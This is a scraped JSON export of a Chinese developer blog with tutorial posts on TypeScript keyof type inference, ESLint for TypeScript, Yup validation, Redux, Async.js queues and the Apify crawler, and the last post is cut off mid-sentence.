https://github.com/rematch/rematch/blob/master/docs/recipes/typescript.md","categories":[{"name":"Typescript","slug":"Typescript","permalink":"http://me.lizhooh.com/categories/Typescript/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"},{"name":"学习笔记","slug":"学习笔记","permalink":"http://me.lizhooh.com/tags/学习笔记/"},{"name":"Typescript","slug":"Typescript","permalink":"http://me.lizhooh.com/tags/Typescript/"}]},{"title":"Typescript 类型推断黑魔法","slug":"Typescript/Typescript 类型推断黑魔法","date":"2019-05-26T03:54:18.000Z","updated":"2021-06-15T06:10:52.897Z","comments":true,"path":"/stories/2019/05/Typescript/Typescript 类型推断黑魔法/","link":"","permalink":"http://me.lizhooh.com/stories/2019/05/Typescript/Typescript 类型推断黑魔法/","excerpt":"前言大家都知道 Typescript 的类型基本都是静态的，但是有一个 keyof 的关键字，可以让我们实现一些动态的类型推断。","text":"前言大家都知道 Typescript 的类型基本都是静态的，但是有一个 keyof 的关键字，可以让我们实现一些动态的类型推断。 黑魔法keyof 是一个关键字可以遍历 TS 的数据类型。 123456789101112131415function pluck&lt;T, K extends keyof T&gt;(o: T, names: K): T[K] &#123; return T[K];&#125;interface Person &#123; name: string, age: number,&#125;const person: Person = &#123; name: 'Jarid', age: 35,&#125;;const str: string = pluck(person, 'name'); 其中，这里就是黑魔法所在： 123function pluck&lt;T, K extends keyof T&gt;(o: T, names: K[]): T[K] &#123; return T[K];&#125; 主要体现在： pluck 是一个泛型，因为 TS 能根据参数的位置推断泛型的类型，因此在调用时可以省略泛型，等效于：pluck(person, ‘name’); pluck 有一个主动的泛型参数 T，K 是继承于 T 的 key，也就是 K 是 T 中 key 任意的一个。这里如果 T 是 Person，那么 K 可以是 ‘name’ 或 ‘age’。 pluck 的形式可以简化为 pluck&lt;Person, string extends keyof Person&gt;(o: Person, names: string); 其中 keyof Person 等效于：&#39;name&#39; | &#39;age&#39;。 于是对于约束 string extends &#39;name&#39; | &#39;age&#39;。 依赖于某个对象进行推断假设我们有一个对象是动态生成的，可以依赖于某个变量进行内容推断。 123456789type P&lt;T&gt; = &#123; [K in keyof T]?: T[K];&#125;;const obj = &#123; name: 'abc', age: 'adasd', id: 'aaa' &#125;;function hello(data: P&lt;typeof obj&gt;) &#123;&#125; 进一步推断上面的代码，可应用于以下的场景，例如 storage 函数，我们现在 get(key) 中 key 只能是配置的白名单字符串。 12345678910111213141516171819202122232425262728293031323334353637import Store from 'wxapp-store';const storage = new Store();const errorMsg = 'storage: No index exists';class Storage&lt;T&gt; &#123; // 白名单 keys: T; constructor(keys: T) &#123; this.keys = keys; &#125; get&lt;K extends keyof T&gt;(k: K): Promise&lt;any&gt; &#123; if (this.keys[k]) &#123; return storage.get(this.keys[k] as any); &#125; return Promise.reject(errorMsg); &#125; set&lt;K extends keyof T&gt;(k: K, value): Promise&lt;any&gt; &#123; if (this.keys[k]) &#123; return storage.set(this.keys[k] as any, value); &#125; return Promise.reject(errorMsg); &#125; remove&lt;K extends keyof T&gt;(k: K): Promise&lt;any&gt; &#123; if (this.keys[k]) &#123; return storage.remove(this.keys[k] as any); &#125; return Promise.reject(errorMsg); &#125;&#125;const storage = new Storage(&#123; TOKEN: 'TOKEN',&#125;);storage.get('TOKEN'); 更深层次的推断在 redux 的场景里更多的时候，我都是自己封装了 redux 的 reducers 和 action 的代码，形成了一个 modal 结构。 1234567891011121314151617interface IState &#123; count: number,&#125;const state: IState = &#123; count: 0&#125;;const modal = &#123; state, reducers: &#123; add(state: IState, payload) &#123; return &#123; ...state, count: payload &#125;; &#125; &#125;, actions: &#123; &#125;,&#125; 这时候，在 modal 里 state 的类型挺好写，但是有时候我们需要能够提供 rootState 的类型，这时候这么做呢？ 编写一个能够更加 modals 推断类型的 type。 12345678910111213141516export interface ModelConfig&lt;S = any, SS = S&gt; &#123; name?: string, state: S,&#125;export type Models = &#123; [key: string]: ModelConfig,&#125;// M 继承至 Modelsexport type FromModels&lt;M extends Models&gt; = &#123; // 遍历 M 中 state 的 key [modelKey in keyof M]: M[modelKey]['state'],&#125;export type RootState&lt;M extends Models&gt; = FromModels&lt;M&gt; 我们可以使用 RootState 进行推断。 123456789101112131415161718// modals/index.tsexport interface IState &#123; count: number,&#125;export const state: IState = &#123; count: 0,&#125;;export default &#123; state: 0, reducers: &#123; add(state: IState, payload) &#123; state.count = state.count + payload; &#125; &#125;, actions: &#123; &#125;&#125;; 推断 rootState 类型。 1234567import index from './modals/index';const modals = &#123; index&#125;;export type IRootState = RootState&lt;modals&gt;; 这样就可以方便的应用在 React connect 上。 12345678910111213141516171819import React, &#123; Component &#125; from 'react';import &#123; View, Text &#125; from 'react-native';import &#123; connect &#125; from 'react-redux';import &#123; IRootState &#125; from '@/stores';@connect(state =&gt; (&#123; state &#125;))export default class Index extends Component&lt;&#123; state: IRootState['index'],&#125;&gt; &#123; render() &#123; const &#123; count &#125; = this.props.state; return ( &lt;View&gt; &lt;Text&gt;&#123;count&#125;&lt;/Text&gt; &lt;/View&gt; ); &#125;&#125; 将必须变成可选在写一些 redux 库的时候用户定义的类型是必选的，但是在触发 dispatch 是应该是可选的，这样就要用到将必选，变成可选的黑魔法。 123456789export interface IState &#123; count: number, name: string,&#125;export type TCommit&lt;S = any&gt; = (state: S) =&gt; any;// 调用 commit 里报错，因为 name 是必须的。commit(&#123; count: count + 1 &#125;); 用户的定义不变，在底层就行适配改成可选字段。 1234567891011export interface IState &#123; count: number, name: string,&#125;export type TCommit&lt;S = any&gt; = (state: &#123; [key in keyof S]?: S[key]&#125;) =&gt; any;// 调用 commit 里报错，因为 name 是必须的。commit(&#123; count: count + 1 &#125;); 说明： 这里的其秘籍是，使用 in keyof 遍历 S，然后在后面添加 ? 实现可选。","categories":[{"name":"Typescript","slug":"Typescript","permalink":"http://me.lizhooh.com/categories/Typescript/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"},{"name":"学习笔记","slug":"学习笔记","permalink":"http://me.lizhooh.com/tags/学习笔记/"},{"name":"Typescript","slug":"Typescript","permalink":"http://me.lizhooh.com/tags/Typescript/"}]},{"title":"使用 ESLint 检查 Typescript 的代码","slug":"Typescript/使用 ESLint 检查 Typescript 的代码","date":"2019-05-24T10:34:56.000Z","updated":"2021-06-15T06:10:52.897Z","comments":true,"path":"/stories/2019/05/Typescript/使用 ESLint 检查 Typescript 的代码/","link":"","permalink":"http://me.lizhooh.com/stories/2019/05/Typescript/使用 ESLint 检查 Typescript 的代码/","excerpt":"前言ESLint 是一个代码检查工具，主要用来发现代码错误、统一代码风格，目前已被广泛的应用于各种 JavaScript 项目中。 TypeScript 除了是一个编译 ts 文件的工具以外，还可以作为一个静态代码检查工具使用。TypeScript 会对文件进行语法解析，如果遇到一些语法错误，或使用了未定义的变量，则会报错。 ESLint 也会对文件进行语法解析，它可以对一些代码风格进行约束，发现未定义的变量，但是对于错误的属性或方法引用，却无能为力。","text":"前言ESLint 是一个代码检查工具，主要用来发现代码错误、统一代码风格，目前已被广泛的应用于各种 JavaScript 项目中。 TypeScript 除了是一个编译 ts 文件的工具以外，还可以作为一个静态代码检查工具使用。TypeScript 会对文件进行语法解析，如果遇到一些语法错误，或使用了未定义的变量，则会报错。 ESLint 也会对文件进行语法解析，它可以对一些代码风格进行约束，发现未定义的变量，但是对于错误的属性或方法引用，却无能为力。 ESLint 添加对 TS 的支持安装两个比较重要的模块： 1yarn add eslint-plugin-typescript @typescript-eslint/parser --dev 如果之前配置了 ESLint，添加对 TS 需要把 babel-parser 改成 typescript-parser。 123456789101112131415161718&#123; \"extends\": [\"reactapp\"], \"parser\": \"@typescript-eslint/parser\", \"plugins\": [ \"typescript\" ], \"parserOptions\": &#123; \"ecmaFeatures\": &#123; \"jsx\": true &#125;, \"jsx\": true, \"useJSXTextNode\": true, \"project\": \"./tsconfig.json\", \"tsconfigRootDir\": \"./\", \"extraFileExtensions\": [\".ts\", \".tsx\"] &#125;, ...&#125; 这样改完后还不行，因为 ESLint 不知道 .ts，.tsx 文件。在 vscode 里添加这样的配置，这样 ESLint 会检索到 ts 的文件。 123456\"eslint.validate\": [ \"javascript\", \"javascriptreact\", \"typescript\", \"typescriptreact\"] 另外记得设置文件的语言： 1234\"files.associations\": &#123; \"*.js\": \"javascript\", \"*.tsx\": \"typescriptreact\"&#125; 附件贴一下 tsconfig 的配置，是宽松模式。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253&#123; \"compilerOptions\": &#123; \"target\": \"es2017\", \"module\": \"commonjs\", \"removeComments\": false, \"preserveConstEnums\": true, \"moduleResolution\": \"node\", \"experimentalDecorators\": true, \"noImplicitAny\": false, \"allowSyntheticDefaultImports\": true, \"outDir\": \"lib\", \"noUnusedLocals\": true, \"noUnusedParameters\": true, \"strictNullChecks\": true, \"sourceMap\": true, \"baseUrl\": \".\", \"rootDir\": \".\", \"jsx\": \"preserve\", \"jsxFactory\": \"Taro.createElement\", \"allowJs\": true, \"resolveJsonModule\": true, \"allowUnusedLabels\": true, \"esModuleInterop\": true, \"locale\": \"zh-CN\", \"typeRoots\": [ \"node_modules/@types\", \"global.d.ts\" ], \"paths\": &#123; \"@/components/*\": [\"src/components/*\"], \"@/utils/*\": [\"src/utils/*\"], \"@/utils\": [\"src/utils/index\"], \"@/styles/*\": [\"src/styles/*\"], \"@/router/*\": [\"src/router/*\"], \"@/router\": [\"src/router/index\"], \"@/assets/\": [\"src/assets/*\"], \"@/api/\": [\"src/api/*\"], \"@/api\": [\"src/api/index\"], \"@/common/\": [\"src/common/*\"], \"@/storage\": [\"src/storage/index\"], \"@/storage/*\": [\"src/storage/*\"], &#125; &#125;, \"exclude\": [ \"node_modules\", \"dist\" ], \"include\": [ \"src\", \"global.d.ts\" ], \"compileOnSave\": false&#125;","categories":[{"name":"Typescript","slug":"Typescript","permalink":"http://me.lizhooh.com/categories/Typescript/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"},{"name":"学习笔记","slug":"学习笔记","permalink":"http://me.lizhooh.com/tags/学习笔记/"},{"name":"Typescript","slug":"Typescript","permalink":"http://me.lizhooh.com/tags/Typescript/"}]},{"title":"JS 数据格式验证框架：Yup 使用指南","slug":"Nodejs/JS 数据格式验证框架：Yup 使用指南","date":"2019-05-19T08:32:29.000Z","updated":"2021-06-15T06:10:52.833Z","comments":true,"path":"/stories/2019/05/Nodejs/JS 数据格式验证框架：Yup 使用指南/","link":"","permalink":"http://me.lizhooh.com/stories/2019/05/Nodejs/JS 数据格式验证框架：Yup 使用指南/","excerpt":"前言Yup 是一个 JavaScript 对象模式验证器和对象解析器。API 和风格是很大程度上受到 Joi 的启发，拥有更小的 API，可以适用于在浏览器或 Nodejs 等 Javascript 运行环境上。","text":"前言Yup 是一个 JavaScript 对象模式验证器和对象解析器。API 和风格是很大程度上受到 Joi 的启发，拥有更小的 API，可以适用于在浏览器或 Nodejs 等 Javascript 运行环境上。 定义数据模型123456789const &#123; object, string, number, date, setLocale &#125; = require('yup');const contactSchema = object(&#123; name: string().required(), age: number().required().positive().integer(), email: string().email(), website: string().url(), createdOn: date().default(() =&gt; new Date())&#125;); 说明： 定义了一个数据模型，指明了 name 是必须的，并且是字符串，age 是正整数。 尝试转换123456789101112// 尝试转换const res = contactSchema.cast(&#123; name: 'jimmy', age: '24', createdOn: '2014-09-23T19:25:25Z'&#125;);// =&gt; &#123;// name: 'jimmy',// age: 24,// createdOn: '2014-09-23T19:25:25Z'// &#125; 说明： 使用 cast 对数据进行转换。 验证如果只是验证则使用 isValid 即可。 12345678910// 验证结果contactSchema.isValid(&#123; name: 'jimmy', age: -24, createdOn: '2014-09-23T19:25:25Z'&#125;).then(res =&gt; &#123; console.log(res);&#125;).catch(err =&gt; &#123; console.log(err);&#125;); 如果需要知道验证的错误位置，则使用 validate 函数。 123456789contactSchema.validate(&#123; name: 'jimmy', age: -24, createdOn: '2014-09-23T19:25:25Z'&#125;).then(res =&gt; &#123; console.log(res);&#125;).catch(err =&gt; &#123; console.log(err);&#125;); 自定义错误信息1234567891011121314151617181920import &#123; setLocale, string, number, object &#125; from 'yup';setLocale(&#123; number: &#123; min: '年龄应该最小为 $&#123;min&#125;', &#125;,&#125;);// now use Yup schemas AFTER you defined your custom dictionaryconst schema = object().shape(&#123; name: string(), age: number().min(18),&#125;);schema.validate(&#123; name: 'jimmy', age: 11 &#125;).catch(err =&gt; &#123; console.log( err.name, // =&gt; 'ValidationError' err.errors, // =&gt; ['年龄应该最小为 18'] );&#125;); 参考资料 https://github.com/jquense/yup","categories":[{"name":"Nodejs","slug":"Nodejs","permalink":"http://me.lizhooh.com/categories/Nodejs/"}],"tags":[{"name":"后端","slug":"后端","permalink":"http://me.lizhooh.com/tags/后端/"},{"name":"Nodejs","slug":"Nodejs","permalink":"http://me.lizhooh.com/tags/Nodejs/"},{"name":"学习笔记","slug":"学习笔记","permalink":"http://me.lizhooh.com/tags/学习笔记/"}]},{"title":"Redux 核心概念与哲学","slug":"Redux/Redux 核心概念与哲学","date":"2019-05-19T07:46:03.000Z","updated":"2021-06-15T06:10:52.891Z","comments":true,"path":"/stories/2019/05/Redux/Redux 核心概念与哲学/","link":"","permalink":"http://me.lizhooh.com/stories/2019/05/Redux/Redux 核心概念与哲学/","excerpt":"前言目录： 什么是 Redux ? 为什么（什么时候）使用 Redux ? Redux 核心概念 Redux 设计哲学 Redux 中间件 React + Redux 使用指南","text":"前言目录： 什么是 Redux ? 为什么（什么时候）使用 Redux ? Redux 核心概念 Redux 设计哲学 Redux 中间件 React + Redux 使用指南 什么是 Redux ？ Redux 是 JavaScript 状态容器，提供可预测化的状态管理。 使用 Redux 可以让你构建一致化的应用，运行于不同的环境（客户端、服务器、原生应用），并且易于测试。不仅于此，它还提供超爽的开发体验，比如有一个时间旅行调试器可以编辑后实时预览。 Redux 是纯的 Javascript 实现，可以在多种 js 运行环境中使用。 Redux 遵循单向数据流。 如果把 React 看出 View 层，那么 Redux 就是一个 M 层的角色。 为什么（什么时候）使用 Redux ？ 过早优化是万恶之源 —— Donald Knuth 本文描述了什么时候开始使用 Redux。描述了在构建一个真实 React App 时，从没有使用 Redux 到使用 Redux 的过程以及收获。 首先，并不是所有的 React 应用程序都需要使用 Redux。事实上，大多数非常简单的 React 应用程序根本不能从 Redux 中受益。 开发的第 1 天使用 React 本地组件状态（state）。 React 使用单向数据流，数据由高层流往底层流动，这意味着父组件把自身的状态作为属性传递给子组件。 1234567891011121314151617181920212223242526272829import React, &#123; Component &#125; from 'react';const A = (&#123; count &#125;) =&gt; ( &lt;div&gt;A: &#123;count&#125;&lt;/div&gt;);const B = (&#123; count &#125;) =&gt; ( &lt;div&gt;B: &#123;count&#125;&lt;/div&gt;);class P extends Component &#123; constructor(props) &#123; super(props); this.state = &#123; count1: 0, count2: 1, &#125;; &#125; render() &#123; const &#123; count1, count2 &#125; = this.state; return ( &lt;div&gt; &lt;A count=&#123;count1&#125; /&gt; &lt;B count=&#123;count2&#125; /&gt; &lt;/div&gt; ); &#125;&#125; 开发的第 5 天随着添加更多的功能，非父子组件之间需要共享一些状态。 例如在 P 组件之下的 A，B 组件之间需要通信，那么需要通过提升状态来解决这个问题。 这意味着我们将状态（和改变这个状态的函数）提升到最接近的祖先（Container Component）。我们将这些函数绑定到容器组件，并将它们作为属性向下传递。这意味着子组件可以触发其父组件中的状态更改，这将更新树中的所有其他组件。 图二 1234567891011121314151617181920212223242526272829303132333435import React, &#123; Component &#125; from 'react';const A = (&#123; count &#125;) =&gt; ( &lt;div&gt;A: &#123;count&#125;&lt;/div&gt;);const B = (&#123; count, onClick &#125;) =&gt; ( &lt;div&gt; &lt;p&gt;B: &#123;count&#125;&lt;/p&gt; &lt;button onClick=&#123;onClick&#125;&gt;改变 A 组件 count&lt;/button&gt; &lt;/div&gt;);class P extends Component &#123; constructor(props) &#123; super(props); this.state = &#123; count1: 0, count2: 1, &#125;; &#125; onClick = e =&gt; &#123; this.setState(&#123; count1: 2 &#125;); &#125; render() &#123; const &#123; count1, count2 &#125; = this.state; return ( &lt;div&gt; &lt;A count=&#123;count1&#125; /&gt; &lt;B count=&#123;count2&#125; onClick=&#123;this.onClick&#125; /&gt; &lt;/div&gt; ); &#125;&#125; 开发的第 10 天随着添加了更多的功能和组件，我们的应用程序状态流程开始看起来像这样 …… 不同组件之间多个数据进行通信，多层次的提升状态。 图三 开发的第 n 天随着应用越来越大，数据状态越来越多，管理不断变化的 state 非常困难。如果一个 model 的变化会引起另一个 model 变化，那么当 view 变化时，就可能引起对应 model 以及另一个 model 的变化。 如果您开始遇到上述某些问题，则可能意味着您应该使用 Redux 了。 图四 使用 Redux当我们使用 Redux 后，状态变成了这样： 图五 如果应用符合以下某些条件，那么我认为应该立即使用 Redux。 应用里存在共享数据状态。 UI 可以根据应用程序状态显着变化。 一个 View 有多个来自不同的领域，关联的数据状态。 并不总是以一种线性的，单向的方式流动。 许多不相关的组件以相同的方式更新状态。 状态树并不简单。 状态以许多不同的方式更新。 您需要能够撤消以前的用户操作。 Redux 核心概念Redux 的核心概念，包括了 Store，Action，Reducer。 Store：单一的数据源。 使用一个 Javascript Object Tree 来记录数据的状态。 Action：触发 state 改变的动作。 是把数据从 View 传到 Store 的有效载荷。 Reducer：决定如何更新 state 的结构。 Reducer 是一个纯函数，指定了应用状态的变化如何响应 Action 并发送到 Store 的，记住 Action 只是描述了有事情发生了这一事实，并没有描述应用如何更新 State。 Redux 设计哲学redux 有三大设计哲学： 单一的数据源 顾名思义就是所有的状态信息都存储在同一个容器里。 状态是只读，不可变 redux 是用来管理状态的，竟然能管理，那就包含了对状态的增、删、改操作。这里的只读是指新状态不会破坏原来的旧状态，也就是说新状态的产生过程是：1、先从旧状态进行深拷贝得到一个复本。2、对复本进行操作得到新状态。 使用纯函数来更新状态 纯函数是指输入相同的参数时，总能得到相同的输出结果，并且不会修改输入的参数。 这三大设计哲学主要是为了简化对状态的管理，让状态可预测、可追踪，从而易于维护代码，也更易于排查 bug。 Redux 中间件redux 中间件提供的是位于 action 被派发之后，到达 reducer 之前的扩展点，因此可以利用 redux 中间件来完成日志记录、调用异步接口或者路由等。 redux 中间件的作用主要有两个：1、截获 action2、发出 action redux 中间件异步请求的工作流如下图所示： React + Redux 使用指南Redux 官方提供的 React 绑定库。 具有高效且灵活的特性。 第一步，初始化 Store。 12345678import &#123; createStore &#125; from 'redux';const initState = &#123; count1: 0, count2: 1,&#125;;const store = createStore(reducer, initState); 第二步，编写 Reducer。 12345678910// (state, action) =&gt; newStatefunction reducer(state, action) &#123; switch action.type &#123; case 'ADD': return &#123; ...state, count1: state.count1 + action.payload, &#125; default: return state; &#125;&#125; 第三步，编写 Action。 123function add(n) &#123; return &#123; type: 'ADD', payload: n &#125;&#125; 第四步，为 React 提供上下文。 123456789import &#123; Provider &#125; from 'react-redux';import store from './stores';ReactDOM.render( &lt;Provider store=&#123;store&#125;&gt; &lt;App /&gt; &lt;/Provider&gt; document.getElementById('root'),); 第五步，连接到 React Component。 123456789101112131415161718192021222324252627282930313233import React, &#123; Component &#125; from 'react';import &#123; connect &#125; from 'react-redux';import * as actions from './action';// 把 A 组件连接到 state.count1 上const CountA = connect( state =&gt; (&#123; count: state.count1 &#125;))((&#123; count &#125;) =&gt; ( &lt;div&gt;A: &#123;count&#125;&lt;/div&gt;));// 把 B 组件连接到 state.count2 上const CountB = connect( state =&gt; (&#123; count: state.count2 &#125;), actions,)((&#123; count, add &#125;) =&gt; ( &lt;div&gt; &lt;p&gt;B: &#123;count&#125;&lt;/p&gt; &lt;button onClick=&#123;e =&gt; add(1)&#125;&gt;改变 A 组件 count&lt;/button&gt; &lt;/div&gt;));class P extends Component &#123; render() &#123; return ( &lt;div&gt; &lt;CountA count=&#123;count1&#125; /&gt; &lt;CountB count=&#123;count2&#125; /&gt; &lt;/div&gt; ); &#125;&#125; 参考资料 https://slides.com/jenyaterpil/redux-from-twitter-hype-to-production","categories":[{"name":"Redux","slug":"Redux","permalink":"http://me.lizhooh.com/categories/Redux/"}],"tags":[{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"},{"name":"React","slug":"React","permalink":"http://me.lizhooh.com/tags/React/"},{"name":"Redux","slug":"Redux","permalink":"http://me.lizhooh.com/tags/Redux/"}]},{"title":"『Async』Queue Api 详解","slug":"Nodejs/『Async』Queue Api 详解","date":"2019-05-04T10:36:12.000Z","updated":"2021-06-15T06:10:52.842Z","comments":true,"path":"/stories/2019/05/Nodejs/『Async』Queue Api 详解/","link":"","permalink":"http://me.lizhooh.com/stories/2019/05/Nodejs/『Async』Queue Api 详解/","excerpt":"前言Async 是一个很出名的异步流程控制库，本身使用回调的风格编写。在 Async 里提供了 Queue 的一个 API，但是文档里并没有很详细的解释一个带有异步的队列是如何控制的，这里来简单的介绍一些。 之前的科普文章：使用『Async』进行异步并发流程控制","text":"前言Async 是一个很出名的异步流程控制库，本身使用回调的风格编写。在 Async 里提供了 Queue 的一个 API，但是文档里并没有很详细的解释一个带有异步的队列是如何控制的，这里来简单的介绍一些。 之前的科普文章：使用『Async』进行异步并发流程控制 Queue下面是 Queue Api 的介绍。 创建 queue 具有指定的对象 concurrency。添加到其中的任务 queue 是并行处理的（最高 concurrency 限制）。如果所有 workers 都在进行中，则任务将排队，直到有一个可用。一旦 worker 完成 task，task 就会调用该回调。 在创建 queue 里会有两个参数，一个是执行函数，另一个是并发执行量。 worker - 用于处理排队任务的异步函数。如果要处理来自单个任务的错误，请将回调传递给 q.push()。 concurrency - 用于确定有多少 worker 功能应该并行运行。如果省略，则并发默认为 1。如果并发 0，则抛出错误。 来看看官方的示例： 123456789101112131415161718192021222324252627282930const Async = require('async');// create a queue object with concurrency 2const q = Async.queue(function (task, callback) &#123; console.log('hello ' + task.name); callback();&#125;, 2);// assign a callbackq.drain = function () &#123; console.log('all items have been processed');&#125;;// add some items to the queueq.push(&#123; name: 'foo' &#125;, function (err) &#123; console.log('finished processing foo');&#125;);q.push(&#123; name: 'bar' &#125;, function (err) &#123; console.log('finished processing bar');&#125;);// add some items to the queue (batch-wise)q.push([&#123; name: 'baz' &#125;, &#123; name: 'bay' &#125;, &#123; name: 'bax' &#125;], function (err) &#123; console.log('finished processing item');&#125;);// add some items to the front of the queueq.unshift(&#123; name: 'bar' &#125;, function (err) &#123; console.log('finished processing bar');&#125;); 官方的示例，非常简单，因为都是同步函数，因此还不知道异步是怎么执行的。 异步队列下面是我经过改造的异步队列。 1234567891011121314151617181920212223242526272829303132333435const Async = require('async');// 创建一个队列，并发为 2const m = 2;const q = Async.queue((task, callback) =&gt; &#123; task().then(res =&gt; &#123; console.timeEnd(res); callback(null, res); &#125;);&#125;, m);// assign a callbackq.drain = function () &#123; console.log('全部执行完成！');&#125;;// 执行函数function wait(time, str) &#123; console.log('同步执行：', str); // 这里是同步执行 console.time(str); return () =&gt; new Promise( rs =&gt; setTimeout(() =&gt; rs(str), time) ); // 这里是异步执行&#125;// add some items to the queueq.push(wait(1000, '1'), (err, res) =&gt; console.log('结果：', res));q.push(wait(1500, '2'), (err, res) =&gt; console.log('结果：', res));// add some items to the queue (batch-wise)q.push([ wait(1000, '3'), wait(1000, '4'), wait(1000, '5'),], (err, res) =&gt; console.log('结果：', res)); 运行结果： 12345678910111213141516同步执行： 1同步执行： 2同步执行： 3同步执行： 4同步执行： 51: 1006.381ms结果： 12: 1507.258ms结果： 23: 2011.440ms结果： 34: 2513.263ms结果： 45: 3012.795ms结果： 5全部执行完成！ 说明： new Queue 的执行函数并不能是 async 函数，因此需要在里面使用 Promise then 的形式调用任务函数。 callback 函数就是队列执行完成后的函数，调用之后会执行下一个函数，callback 的参数第一个是 err，第二个是 result，需要你手动导入参数。 因为设置并发为 2，所以执行的顺序是 1,2 -&gt; 3,4 -&gt; 5，因此看到了 3 的执行时 2 秒多，其中包括了 1,2 的执行时间，3 是在 1,2 执行完成（1 秒）之后在执行的。 整个队列的执行顺序是：先执行 1,2 因为并发为 2，接着 1 执行完成，3 取代 1 的位置，0.5s 后 2 执行完成，4 取代 2 的位置，0.5s 后 3 执行完成，5 取代 3 的位置。 任务一旦执行完成就会从队列里弹出。 看起来似乎有点乱，总之 Queue 能够帮我们控制执行的并发量。你可以在 callback 里添加新的任务，让他一直执行下去。 1234567891011let n = 6;const q = Async.queue((task, callback) =&gt; &#123; task().then(res =&gt; &#123; console.timeEnd(res); if (n &lt; 10) &#123; q.push(wait(1000, n + '')); n += 1; &#125; callback(null, res); &#125;);&#125;, m); 关于 es6 asyncAsync.js 默认是 Nodejs 回调函数风格的，如果你使用 es6 async 也是可以接受的，Async.js 会检查回调是否是 Promise 对象。如果使用 es6 async 则不提供 callback 函数。 12345678910111213const q = Async.queue((task, callback) =&gt; &#123; task().then(res =&gt; &#123; console.timeEnd(res); callback(null, res); &#125;);&#125;, m);// 改成const q = Async.queue(async task =&gt; &#123; const res = await task(); console.timeEnd(res); return res;&#125;, m); 返回值作为 callback 的 result 值，如果有错误，直接 throw 即可。 Queue APIqueue 实例的方法与属性： 12const queue = new Async.queue(worker, concurrency);queue.push(...); 名称 类型 说明 length function 返回等待处理的任务数的函数。 started boolean 一个布尔值，指示队列是否已开始处理任何任务。 running function 返回当前正在处理的任务数的函数。 workersList function 返回当前正在处理的任务数组的函数。 idle function 如果有等待或正在处理的任务，则返回 false 的函数，否则返回 true。 concurrency number 用于确定 worker 应并行运行多少函数的整数。queue 创建后，可以更改此属性 以即时更改并发。 push function 添加一个新任务 queue。调用 callback 一旦 worker 完成处理任务。tasks 可以提交数组而不是单个任务。相应的回调用于列表中的每个任务。 unshift function 在队列前面添加一个新任务。 remove function 从队列中删除与测试功能匹配的任务。如果这是一个 priorityQueue 对象，测试函数将传递一个带有 data 属性的对象和一个 priority 属性 。调用 with ，表单的位置 并返回一个布尔值。 saturated function 当正在运行的工作线程数达到 concurrency 限制时调用的回调，并且其他任务将排队。 unsaturated function 当正在运行的 worker 数量小于 concurrency ＆ bufferlimits 时调用的回调，并且其他任务不会排队。 buffer number 一个最小阈值缓冲区，以便说 queue 是 unsaturated。 empty function 当队列中的最后一项任务被赋予时调用的回调 worker。 drain function 队列所有任务执行完成后调用。 error function 任务错误时调用的回调。有签名 function(error, task)。 paused boolean 用于确定队列是否处于暂停状态的布尔值。 pause function 一个暂停任务处理直到 resume() 被调用。 resume function 在队列暂停时恢复排队任务处理的函数。 kill function 一个函数，用于删除 drain 回调并清空队列中剩余的任务，迫使其进入空闲状态。调用此函数后，不应再将任务推送到队列中。 优先队列与 Queue 相类似的 API 是 priorityQueue，它具有优先队列的特性，会根据任务的权值来优先执行。 1push(task, priority, [callback]); priority 任务的优先级，在 priorityQueue 里不能使用 unshift 方法。 参考资料 http://caolan.github.io/async/docs.html#queue","categories":[{"name":"Nodejs","slug":"Nodejs","permalink":"http://me.lizhooh.com/categories/Nodejs/"}],"tags":[{"name":"后端","slug":"后端","permalink":"http://me.lizhooh.com/tags/后端/"},{"name":"Nodejs","slug":"Nodejs","permalink":"http://me.lizhooh.com/tags/Nodejs/"},{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"}]},{"title":"Apify：一个 Cheerio + Puppeteer 的爬虫框架","slug":"抓包&爬虫/Apify：一个 Cheerio + Puppeteer 的爬虫框架","date":"2019-04-25T02:33:05.000Z","updated":"2021-06-15T06:10:52.915Z","comments":true,"path":"/stories/2019/04/抓包&爬虫/Apify：一个 Cheerio + Puppeteer 的爬虫框架/","link":"","permalink":"http://me.lizhooh.com/stories/2019/04/抓包&爬虫/Apify：一个 Cheerio + Puppeteer 的爬虫框架/","excerpt":"前言Apify.js 是一款用于 JavaScript 的可伸缩的 web 爬虫和抓取库。能通过无头（headless）Chrome 和 Puppeteer 实现数据提取和 Web 自动化作业的开发。它提供了管理和自动扩展无头 Chrome/Puppeteer 实例池的工具，维护要爬网的 URL 队列，将爬网结果存储到本地文件系统或云端。","text":"前言Apify.js 是一款用于 JavaScript 的可伸缩的 web 爬虫和抓取库。能通过无头（headless）Chrome 和 Puppeteer 实现数据提取和 Web 自动化作业的开发。它提供了管理和自动扩展无头 Chrome/Puppeteer 实例池的工具，维护要爬网的 URL 队列，将爬网结果存储到本地文件系统或云端。 基本使用Apify 的使用非常简单，基本就是做一些配置，然后就哗啦哗啦的启动起来了。 1234567891011121314151617181920212223const Apify = require('apify');Apify.main(async () =&gt; &#123; const requestQueue = await Apify.openRequestQueue(); await requestQueue.addRequest(&#123; url: 'https://donghua.agefans.com/' &#125;); const pseudoUrls = [new Apify.PseudoUrl('https://donghua.agefans.com/[.*]')]; const crawler = new Apify.PuppeteerCrawler(&#123; requestQueue, // 请求队列 maxRequestsPerCrawl: 100, // 抓爬的页面数量 maxConcurrency: 10, // 最大并发 // 页面处理函数 handlePageFunction: async (&#123; request, page &#125;) =&gt; &#123; // page 是 puppeteer 的 page 对象 const title = await page.title(); console.log(`Title of $&#123;request.url&#125;: $&#123;title&#125;`); // 选择的元素 &lt;a&gt; await Apify.utils.enqueueLinks(&#123; page, selector: 'a', pseudoUrls, requestQueue &#125;); &#125;, &#125;); await crawler.run();&#125;); 爬虫类Apify 提供了三个爬虫类： BasicCrawler：非常基础爬虫结构。 CheerioCrawler：结合了 cheerio 的爬虫结构。 PuppeteerCrawler：结合了 puppeteer 的爬虫结构。 下面是 BasicCrawler 的使用示例，可以看到 BasicCrawler 